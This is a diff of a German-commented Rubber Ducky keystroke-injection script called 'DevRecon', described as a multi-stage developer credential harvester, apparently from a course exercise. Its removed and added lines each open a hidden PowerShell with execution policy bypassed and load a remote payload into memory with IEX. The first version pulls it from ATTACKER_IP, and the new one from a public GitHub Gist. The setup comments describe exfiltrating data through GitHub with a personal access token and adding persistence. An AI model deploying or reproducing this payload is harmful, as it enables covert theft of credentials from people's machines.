@@ -1,24 +1,21 @@
 REM ============================================================
-REM  W02a.6 – "DevRecon" – Multi-Stage Developer Credential Harvester
+REM  W02a.6 Advanced – "DevRecon" – Multi-Stage Credential Harvester
 REM  Autoren: Raphael Bleier, Joachim Lugger
 REM  Ziel-OS: Windows
 REM
-REM  Stage 1: Rubber Ducky lädt den Payload fileless per IEX.
-REM           Kein Byte landet auf der Festplatte des Opfers.
+REM  Lädt developer_recon.ps1 von einem öffentlichen GitHub Gist.
+REM  Exfiltration und Delivery vollständig über GitHub (HTTPS) –
+REM  kein lokaler Server, funktioniert über alle Subnetze.
 REM
-REM  Voraussetzung:
-REM    Python-Server hostet developer_recon.ps1 unter /payload.ps1
-REM    Ersetze ATTACKER_IP mit der echten IP-Adresse!
+REM  Setup:
+REM    1. GITHUB_PAT (gist-Scope) in developer_recon.ps1 eintragen
+REM    2. developer_recon.ps1 als öffentliches Gist hochladen
+REM    3. GIST_RAW_URL unten ersetzen (Delivery-URL für Persistenz)
+REM    4. PERSIST_GIST_RAW_URL in developer_recon.ps1 eintragen
 REM ============================================================
 
 DELAY 2000
 
 GUI r
 DELAY 500
-
-REM Powershell versteckt starten, ExecutionPolicy umgehen,
-REM Payload direkt in den Speicher laden und ausführen (fileless)
-STRINGLN powershell -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8080/payload.ps1')"
-
-REM Fertig – Rubber Ducky kann abgezogen werden.
-REM Der Payload läuft nun selbstständig im Hintergrund.
+STRINGLN powershell -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('GIST_RAW_URL');"
